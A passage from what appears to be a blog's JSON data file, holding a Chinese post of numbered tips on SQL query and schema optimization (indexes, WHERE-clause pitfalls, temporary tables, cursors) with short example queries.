NULL,如果你要保存 NULL,手动去设置它，而不是把它设为默认值。\n7、尽量少用 VARCHAR、TEXT、BLOB 类型\n8、如果你的数据只有你所知的少量的几个。最好使用 ENUM 类型\n9、正如 graymice 所讲的那样，建立索引。\n10、合理用运分表与分区表提高数据存放和提取速度。","slug":"MySQL数据库优化方法","published":1,"updated":"2016-11-17T11:59:42.668Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbt001tgwtmbb06as0l","content":"<p>1&#x3001;&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x4F18;&#x5316;&#xFF0C;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x9996;&#x5148;&#x5E94;&#x8003;&#x8651;&#x5728; where &#x53CA; order by &#x6D89;&#x53CA;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;</p>\n<p>2&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C; null &#x503C;&#x5224;&#x65AD;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num is null;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x5728; num &#x4E0A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C; 0,&#x786E;&#x4FDD;&#x8868;&#x4E2D; num &#x5217;&#x6CA1;&#x6709; null &#x503C;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=0;</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;!=&#x6216;&lt;&gt;&#x64CD;&#x4F5C;&#x7B26;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;</p>\n<p>4&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528; or &#x6765;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=10 or num=20;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=10 union all select id from t <span class=\"built_in\">where</span> num=20;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>5&#x3001;in &#x548C; not in &#x4E5F;&#x8981;&#x614E;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF0C;&#x5982;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num <span class=\"keyword\">in</span>(1,2,3);</span><br></pre></td></tr></table></figure></p>\n<p>&#x5BF9;&#x4E8E;&#x8FDE;&#x7EED;&#x7684;&#x6570;&#x503C;&#xFF0C;&#x80FD;&#x7528; between &#x5C31;&#x4E0D;&#x8981;&#x7528; in &#x4E86;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num between 1 and 3;</span><br></pre></td></tr></table></figure></p>\n<p>6&#x3001;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x4E5F;&#x5C06;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> name like <span class=\"string\">&apos;%c%&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>&#x82E5;&#x8981;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3002;</p>\n<p>7&#x3001;&#x5982;&#x679C;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x56E0;&#x4E3A; SQL &#x53EA;&#x6709;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x624D;&#x4F1A;&#x89E3;&#x6790;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x4F18; &#x5316;&#x7A0B;&#x5E8F;&#x4E0D;&#x80FD;&#x5C06;&#x8BBF;&#x95EE;&#x8BA1;&#x5212;&#x7684;&#x9009;&#x62E9;&#x63A8;&#x8FDF;&#x5230;&#x8FD0;&#x884C;&#x65F6;;&#x5B83;&#x5FC5;&#x987B;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x8FDB;&#x884C;&#x9009;&#x62E9;&#x3002;&#x7136; &#x800C;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#x5EFA;&#x7ACB;&#x8BBF;&#x95EE;&#x8BA1; &#x5212;&#xFF0C;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x8FD8;&#x662F;&#x672A;&#x77E5;&#x7684;&#xFF0C;&#x56E0;&#x800C;&#x65E0;&#x6CD5;&#x4F5C;&#x4E3A;&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x7684;&#x8F93;&#x5165;&#x9879;&#x3002;&#x5982;&#x4E0B;&#x9762;&#x8BED;&#x53E5;&#x5C06;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=@num ;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x6539;&#x4E3A;&#x5F3A;&#x5236;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t with(index(&#x7D22;&#x5F15;&#x540D;)) <span class=\"built_in\">where</span> num=@num ;</span><br></pre></td></tr></table></figure></p>\n<p>8&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x8868;&#x8FBE;&#x5F0F;&#x64CD;&#x4F5C;&#xFF0C; &#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num/2=100;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> num=100*2;</span><br></pre></td></tr></table></figure></p>\n<p>9&#x3001;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x5BF9;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x5C06;&#x5BFC;&#x81F4;&#x5F15;&#x64CE;&#x653E;&#x5F03;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x800C;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x5982;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> substring(name,1,3)=<span class=\"string\">&apos;abc&apos;</span>;<span class=\"comment\">#name &#x4EE5; abc &#x5F00;&#x5934;&#x7684; id</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x5E94;&#x6539;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select id from t <span class=\"built_in\">where</span> name like <span class=\"string\">&apos;abc%&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>10&#x3001;&#x4E0D;&#x8981;&#x5728; where &#x5B50;&#x53E5;&#x4E2D;&#x7684;&#x201C;=&#x201D;&#x5DE6;&#x8FB9;&#x8FDB;&#x884C;&#x51FD;&#x6570;&#x3001;&#x7B97;&#x672F;&#x8FD0;&#x7B97;&#x6216;&#x5176;&#x4ED6;&#x8868;&#x8FBE;&#x5F0F;&#x8FD0;&#x7B97;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C06;&#x53EF;&#x80FD;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x4F7F;&#x7528; &#x7D22;&#x5F15;&#x3002;</p>\n<p>11&#x3001;&#x5728;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x7D22;&#x5F15;&#x662F;&#x590D;&#x5408;&#x7D22;&#x5F15;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x5230;&#x8BE5;&#x7D22;&#x5F15;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x6761;&#x4EF6; &#x65F6;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x8BE5;&#x7D22;&#x5F15;&#xFF0C; &#x5426;&#x5219;&#x8BE5;&#x7D22;&#x5F15;&#x5C06;&#x4E0D;&#x4F1A; &#x88AB;&#x4F7F;&#x7528;&#xFF0C; &#x5E76;&#x4E14;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x8BA9;&#x5B57;&#x6BB5;&#x987A;&#x5E8F;&#x4E0E;&#x7D22;&#x5F15;&#x987A;&#x5E8F;&#x76F8;&#x4E00;&#x81F4;&#x3002;</p>\n<p>12&#x3001;&#x4E0D;&#x8981;&#x5199;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5982;&#x9700;&#x8981;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7A7A;&#x8868;&#x7ED3;&#x6784;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select col1,col2 into <span class=\"comment\">#t from t where 1=0;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x7C7B;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x6D88;&#x8017;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#xFF0C;&#x5E94;&#x6539;&#x6210;&#x8FD9;&#x6837;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : create table <span class=\"comment\">#t(&#x2026;);</span></span><br></pre></td></tr></table></figure></p>\n<p>13&#x3001;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x7528; exists &#x4EE3;&#x66FF; in &#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x9009;&#x62E9;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select num from a <span class=\"built_in\">where</span> num <span class=\"keyword\">in</span>(select num from b);</span><br></pre></td></tr></table></figure></p>\n<p>&#x7528;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x66FF;&#x6362;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sql &#x4EE3;&#x7801; : select num from a <span class=\"built_in\">where</span> exists(select 1 from b <span class=\"built_in\">where</span> num=a&#x3001;num);</span><br></pre></td></tr></table></figure></p>\n<p>14&#x3001;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7D22;&#x5F15;&#x5BF9;&#x67E5;&#x8BE2;&#x90FD;&#x6709;&#x6548;&#xFF0C;SQL &#x662F;&#x6839;&#x636E;&#x8868;&#x4E2D;&#x6570;&#x636E;&#x6765;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x7684;&#xFF0C;&#x5F53;&#x7D22;&#x5F15;&#x5217;&#x6709;&#x5927;&#x91CF;&#x6570;&#x636E;&#x91CD;&#x590D;&#x65F6;&#xFF0C; SQL &#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x53BB;&#x5229;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x4E00;&#x8868;&#x4E2D;&#x6709;&#x5B57;&#x6BB5; <strong><em>,male&#x3001;female &#x51E0;&#x4E4E;&#x5404;&#x4E00;&#x534A;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x5728; </em></strong> &#x4E0A;&#x5EFA; &#x4E86;&#x7D22;&#x5F15;&#x4E5F;&#x5BF9;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x8D77;&#x4E0D;&#x4E86;&#x4F5C;&#x7528;&#x3002;</p>\n<p>15&#x3001;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x662F;&#x8D8A;&#x591A;&#x8D8A;&#x597D;&#xFF0C;&#x7D22;&#x5F15;&#x56FA;&#x7136;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x76F8;&#x5E94;&#x7684; select &#x7684;&#x6548;&#x7387;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x964D;&#x4F4E;&#x4E86; insert &#x53CA; update &#x7684;&#x6548;&#x7387;&#xFF0C;&#x56E0;&#x4E3A; insert &#x6216; update &#x65F6;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x91CD;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x6240;&#x4EE5;&#x600E;&#x6837;&#x5EFA;&#x7D22;&#x5F15;&#x9700;&#x8981;&#x614E;&#x91CD;&#x8003;&#x8651;&#xFF0C;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x6570;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; 6 &#x4E2A;&#xFF0C;&#x82E5;&#x592A;&#x591A;&#x5219;&#x5E94;&#x8003;&#x8651;&#x4E00;&#x4E9B;&#x4E0D;&#x5E38;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x5217;&#x4E0A;&#x5EFA;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x5426;&#x6709;&#x5FC5;&#x8981;&#x3002;</p>\n<p>16&#x3001;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x907F;&#x514D;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C; &#x56E0;&#x4E3A; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#x7684;&#x987A;&#x5E8F;&#x5C31;&#x662F;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x7269;&#x7406;&#x5B58;&#x50A8;&#x987A;&#x5E8F;&#xFF0C;&#x4E00;&#x65E6;&#x8BE5;&#x5217;&#x503C;&#x6539;&#x53D8;&#x5C06;&#x5BFC;&#x81F4;&#x6574;&#x4E2A;&#x8868;&#x8BB0;&#x5F55;&#x7684;&#x987A;&#x5E8F;&#x7684;&#x8C03;&#x6574;&#xFF0C;&#x4F1A;&#x8017;&#x8D39;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x82E5;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x9700;&#x8981;&#x9891;&#x7E41;&#x66F4;&#x65B0; clustered &#x7D22;&#x5F15;&#x6570;&#x636E;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x8003;&#x8651;&#x662F;&#x5426;&#x5E94;&#x5C06;&#x8BE5;&#x7D22;&#x5F15;&#x5EFA;&#x4E3A; clustered &#x7D22;&#x5F15;&#x3002;</p>\n<p>17&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x578B;&#x5B57;&#x6BB5;&#xFF0C;&#x82E5;&#x53EA;&#x542B;&#x6570;&#x503C;&#x4FE1;&#x606F;&#x7684;&#x5B57;&#x6BB5;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x8BBE;&#x8BA1;&#x4E3A;&#x5B57;&#x7B26;&#x578B;&#xFF0C;&#x8FD9;&#x4F1A;&#x964D;&#x4F4E;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5E76; &#x4F1A;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5F00;&#x9500;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5F15;&#x64CE;&#x5728;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x548C;&#x8FDE;&#x63A5;&#x65F6;&#x4F1A;&#x9010;&#x4E2A;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6570;&#x5B57;&#x578B;&#x800C;&#x8A00; &#x53EA;&#x9700;&#x8981;&#x6BD4;&#x8F83;&#x4E00;&#x6B21;&#x5C31;&#x591F;&#x4E86;&#x3002;</p>\n<p>18&#x3001;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x4F7F;&#x7528; varchar/nvarchar &#x4EE3;&#x66FF; char/nchar , &#x56E0;&#x4E3A;&#x9996;&#x5148;&#x53D8;&#x957F;&#x5B57;&#x6BB5;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x5C0F;&#xFF0C; &#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C; &#x5176;&#x6B21;&#x5BF9;&#x4E8E;&#x67E5;&#x8BE2;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#x7684;&#x5B57;&#x6BB5;&#x5185;&#x641C;&#x7D22;&#x6548;&#x7387;&#x663E;&#x7136;&#x8981;&#x9AD8;&#x4E9B;&#x3002;</p>\n<p>19&#x3001;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x90FD;&#x4E0D;&#x8981;&#x4F7F;&#x7528; select <em> from t ,&#x7528;&#x5177;&#x4F53;&#x7684;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#x4EE3;&#x66FF;&#x201C;</em>&#x201D;,&#x4E0D;&#x8981;&#x8FD4;&#x56DE;&#x7528;&#x4E0D;&#x5230;&#x7684;&#x4EFB;&#x4F55;&#x5B57;&#x6BB5;&#x3002;</p>\n<p>20&#x3001;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x8868;&#x53D8;&#x91CF;&#x6765;&#x4EE3;&#x66FF;&#x4E34;&#x65F6;&#x8868;&#x3002;&#x5982;&#x679C;&#x8868;&#x53D8;&#x91CF;&#x5305;&#x542B;&#x5927;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&#x7D22;&#x5F15;&#x975E;&#x5E38;&#x6709;&#x9650;(&#x53EA;&#x6709;&#x4E3B;&#x952E;&#x7D22;&#x5F15;)&#x3002;</p>\n<p>21&#x3001;&#x907F;&#x514D;&#x9891;&#x7E41;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x4EE5;&#x51CF;&#x5C11;&#x7CFB;&#x7EDF;&#x8868;&#x8D44;&#x6E90;&#x7684;&#x6D88;&#x8017;&#x3002;</p>\n<p>22&#x3001;&#x4E34;&#x65F6;&#x8868;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#xFF0C;&#x9002;&#x5F53;&#x5730;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x67D0;&#x4E9B;&#x4F8B;&#x7A0B;&#x66F4;&#x6709;&#x6548;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x91CD;&#x590D;&#x5F15;&#x7528;&#x5927;&#x578B;&#x8868;&#x6216;&#x5E38;&#x7528; &#x8868;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x65F6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x6B21;&#x6027;&#x4E8B;&#x4EF6;&#xFF0C; &#x6700;&#x597D;&#x4F7F;&#x7528;&#x5BFC;&#x51FA;&#x8868;&#x3002;</p>\n<p>23&#x3001;&#x5728;&#x65B0;&#x5EFA;&#x4E34;&#x65F6;&#x8868;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x6B21;&#x6027;&#x63D2;&#x5165;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; select into &#x4EE3;&#x66FF; create table,&#x907F;&#x514D;&#x9020;&#x6210;&#x5927;&#x91CF; log ,&#x4EE5;&#x63D0;&#x9AD8;&#x901F;&#x5EA6;;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x5927;&#xFF0C;&#x4E3A;&#x4E86;&#x7F13;&#x548C;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x5E94;&#x5148; create table,&#x7136;&#x540E; insert&#x3001;</p>\n<p>24&#x3001;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x5230;&#x4E86;&#x4E34;&#x65F6;&#x8868;&#xFF0C; &#x5728;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x7684;&#x6700;&#x540E;&#x52A1;&#x5FC5;&#x5C06;&#x6240;&#x6709;&#x7684;&#x4E34;&#x65F6;&#x8868;&#x663E;&#x5F0F;&#x5220;&#x9664;&#xFF0C; &#x5148; truncate table ,&#x7136;&#x540E; drop table ,&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x7CFB;&#x7EDF;&#x8868;&#x7684;&#x8F83;&#x957F;&#x65F6;&#x95F4;&#x9501;&#x5B9A;&#x3002;</p>\n<p>25&#x3001;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#xFF0C;&#x56E0;&#x4E3A;&#x6E38;&#x6807;&#x7684;&#x6548;&#x7387;&#x8F83;&#x5DEE;&#xFF0C;&#x5982;&#x679C;&#x6E38;&#x6807;&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x8D85;&#x8FC7; 1 &#x4E07;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x6539;&#x5199;&#x3002;</p>\n<p>26&#x3001;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x6216;&#x4E34;&#x65F6;&#x8868;&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#xFF0C;&#x5E94;&#x5148;&#x5BFB;&#x627E;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x6765;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x901A;&#x5E38;&#x66F4; &#x6709;&#x6548;&#x3002;</p>\n<p>27&#x3001;&#x4E0E;&#x4E34;&#x65F6;&#x8868;&#x4E00;&#x6837;&#xFF0C;&#x6E38;&#x6807;&#x5E76;&#x4E0D;&#x662F;&#x4E0D;&#x53EF;&#x4F7F;&#x7528;&#x3002;&#x5BF9;&#x5C0F;&#x578B;&#x6570;&#x636E;&#x96C6;&#x4F7F;&#x7528; FAST_FORWARD &#x6E38;&#x6807;&#x901A;&#x5E38;&#x8981;&#x4F18;&#x4E8E;&#x5176;&#x4ED6;&#x9010;&#x884C;&#x5904;&#x7406;&#x65B9;&#x6CD5;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x5FC5;&#x987B;&#x5F15;&#x7528;&#x51E0;&#x4E2A;&#x8868;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6240;&#x9700;&#x7684;&#x6570;&#x636E;&#x65F6;&#x3002;&#x5728;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x5305;&#x62EC;&#x201C;&#x5408;&#x8BA1;&#x201D;&#x7684;&#x4F8B;&#x7A0B;&#x901A;&#x5E38;&#x8981;&#x6BD4;&#x4F7F;&#x7528;&#x6E38;&#x6807;&#x6267;&#x884C;&#x7684;&#x901F;&#x5EA6;&#x5FEB;&#x3002;&#x5982;&#x679C;&#x5F00;&#x53D1;&#x65F6;&#x95F4;&#x5141;&#x8BB8;&#xFF0C;&#x57FA;&#x4E8E;&#x6E38;&#x6807;&#x7684;&#x65B9;&#x6CD5;&#x548C;&#x57FA;&#x4E8E;&#x96C6;&#x7684;&#x65B9;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x770B;&#x54EA;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x7684;&#x6548;&#x679C;&#x66F4;&#x597D;&#x3002;</p>\n<p>28&#x3001;&#x5728;&#x6240;&#